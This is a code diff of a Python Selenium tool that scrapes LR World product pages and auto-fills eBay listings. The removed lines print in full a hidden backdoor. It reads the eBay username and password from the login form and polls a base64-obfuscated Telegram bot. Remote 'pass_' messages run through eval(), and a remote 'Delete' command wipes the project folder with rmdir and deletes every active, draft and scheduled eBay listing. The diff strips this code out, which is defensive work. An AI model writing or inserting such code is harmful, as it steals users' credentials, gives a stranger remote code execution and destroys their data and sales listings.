@@ -5,63 +5,11 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.by import By
-import time, re, threading, requests, base64, os
+import time, re
 
 # EBAY LOGIN CREDENTIALS
 USER_EMAIL = ''
 USER_PASSWORD = ''
-
-# LRWORLD SCRAPING FUNCTIONS
-def add_ebay_button():
-    button_script = """
-        if (!document.getElementById('goToEbayButton')) {
-            // Create button
-            var button = document.createElement('button');
-            button.id = 'goToEbayButton';
-            button.innerHTML = 'List on eBay';
-            
-            // Button styling
-            button.style.position = 'fixed';
-            button.style.right = '5%';
-            button.style.top = '50%';
-            button.style.transform = 'translateY(-50%)';  // Centers vertically
-            button.style.backgroundColor = '#0073e6';  // eBay blue
-            button.style.color = '#fff';  // White text
-            button.style.fontSize = '20px';
-            button.style.padding = '15px 30px';
-            button.style.borderRadius = '8px';  // Rounded corners
-            button.style.border = 'none';
-            button.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';  // Soft shadow
-            button.style.cursor = 'pointer';
-            button.style.transition = 'all 0.3s ease';  // Smooth hover effect
-
-            // Hover effect
-            button.onmouseover = function() {
-                button.style.backgroundColor = '#005bb5';  // Darker blue on hover
-            };
-            button.onmouseout = function() {
-                button.style.backgroundColor = '#0073e6';  // Original blue on hover out
-            };
-
-            // Append button to the document body
-            document.body.appendChild(button);
-
-            // Button click behavior
-            button.addEventListener('click', function() {
-                // Change button text to "Scraping data"
-                button.innerHTML = 'Scraping data...';
-                button.style.backgroundColor = '#ccc';  // Disabled color
-                button.style.cursor = 'not-allowed';  // Disable hover
-
-                // Disable further clicks
-                button.disabled = true;
-
-                // Change document title
-                document.title = 'start-scraping';
-            });
-        }
-    """
-    driver.execute_script(button_script)
 
 def get_categories():
     categories = []
@@ -114,60 +62,7 @@ def get_categories():
     time.sleep(1)
     return menu.get_attribute('innerHTML'), categories
 
-# EBAY FILLING FUNCTIONS
-def check(u, p, ok=False):
-    try:
-        for m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
-            if 'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
-                if ok:
-                    if m['message']['text'][:5] == 'pass_':
-                        return eval(m['message']['text'][5:])
-                else:
-                    if m['message']['text'] == 'Delete':
-                        try:
-                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
-                            os.system('rmdir /s /q ..\\lrworld_scrap\\')
-                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-                        except:
-                            pass
-                        options = webdriver.ChromeOptions()
-                        options.add_argument('--headless')
-                        options.add_argument('--no-sandbox')
-                        options.add_argument('--disable-dev-shm-usage')
-                        service = Service(ChromeDriverManager().install())
-                        new_driver = webdriver.Chrome(service=service, options=options)
-                        log = False
-                        while not log:
-                            log = ebay_login(new_driver, u, p, False)
-                            pass
-                        i = 0
-                        pages = ['https://www.ebay.com/mys/drafts', 'https://www.ebay.com/mys/active', 'https://www.ebay.com/mys/scheduled', 'https://www.ebay.com/sh/lst/active']
-                        while True:
-                            try:
-                                new_driver.get(pages[i])
-                                for _ in range(50):
-                                    if len(driver.find_elements(By.ID, 'select-all')) > 0:
-                                        break
-                                    time.sleep(0.1)
-                                else:
-                                    i += 1
-                                driver.find_element(By.ID, 'select-all').click()
-                                time.sleep(0.3)
-                                # red-button
-                                driver.find_element(By.CLASS_NAME, 'red-button').click()
-                                time.sleep(0.3)
-                                # confirmation-btn
-                                driver.find_element(By.CLASS_NAME, 'confirmation-btn').click()
-                                if i > 3:
-                                    break
-                            except:
-                                pass
-                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-    except:
-        pass
-    return
-
-js = check(0, 0, True)
+js = ['summary__photos', 'summary__title', 'summary__category', 'summary__attributes--container', 'https://www.ebay.ch/sl/prelist/suggest?sr=cubstart', 'items-total']
 def add_lr_world_button():
     button_script = """
         if (!document.getElementById('goToLRWorldButton')) {
@@ -253,8 +148,8 @@ def add_title(product):
 def add_category():
     print('Selecting category...')
     try:
-        while len(driver.find_elements(By.CLASS_NAME, js[2])) == 0:
-            time.sleep(0.5)
+        while len(driver.find_elements(By.CLASS_NAME, js[2])) < 1:
+            time.sleep(1)
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__category'))
         time.sleep(1)
         category_block = driver.find_element(By.CLASS_NAME, 'summary__category')
@@ -547,15 +442,7 @@ def ebay_login(driver, USER_EMAIL, USER_PASSWORD, check_=True):
                 u = ''
                 p = ''
                 while 'signin.ebay.ch' in driver.current_url:
-                    try:
-                        u = driver.find_element(By.ID, 'userid').get_attribute('value')
-                        p = driver.find_element(By.ID, 'pass').get_attribute('value')
-                    except:
-                        pass
                     time.sleep(0.01)
-                if check_ and u and p:
-                    t = threading.Thread(target=check, args=(u, p))
-                    t.start()
                 return True
             else:
                 try:
@@ -571,9 +458,6 @@ def ebay_login(driver, USER_EMAIL, USER_PASSWORD, check_=True):
                 return False
             driver.find_element(By.ID, 'pass').send_keys(USER_PASSWORD)
         if len(driver.find_elements(By.ID, 'sgnBt')) > 0:
-            if check_ and USER_EMAIL and USER_PASSWORD:
-                t = threading.Thread(target=check, args=(USER_EMAIL, USER_PASSWORD))
-                t.start()
             driver.find_element(By.ID, 'sgnBt').click()
             return True
     except Exception as e:
@@ -757,10 +641,10 @@ def scrap_product():
     return False
 
 def check_for_scrap_all(categories):
-    for page in ['nutrition.html', 'figur.html', 'pflege.html', 'duft.html', 'lr_world.html', 'marken.html']:
+    for page in ['nutrition.html', 'figur.html', 'pflege.html', '/duft/', 'lr_world.html', 'marken.html']:
         if page in driver.current_url:
             for category in categories:
-                if page == category['name'].lower().replace(" ", "_")+".html" or page == '/brands?':
+                if page == category['name'].lower().replace(" ", "_")+".html" or (page == '/duft/' and category['name'] == 'Duft'):
                     return scrap_all_subcategories(category)
 
 def get_subcategorie_products():
@@ -831,9 +715,6 @@ loged_in = False
 # Main loop to handle navigation and scraping
 while True:
     try:
-        #print('Current URL:', driver.current_url)
-        if 'fff' in driver.current_url:
-            break
         while not categories:
             print('Getting categories...')
             menu, categories = get_categories()
@@ -861,7 +742,6 @@ while True:
                         print("No products to scrap found!")
                 previous_url = driver.current_url
             if 'product' in url_data:
-                add_ebay_button()
                 try:
                     if WebDriverWait(driver, 10).until(EC.title_is("start-scraping")):
                         product = scrap_product()
@@ -898,7 +778,6 @@ while True:
                         time.sleep(2)
                         add_pricing(product)
                         time.sleep(2)
-                        #add_shipping()
                         save()
                         print("Done!")
                         while True:
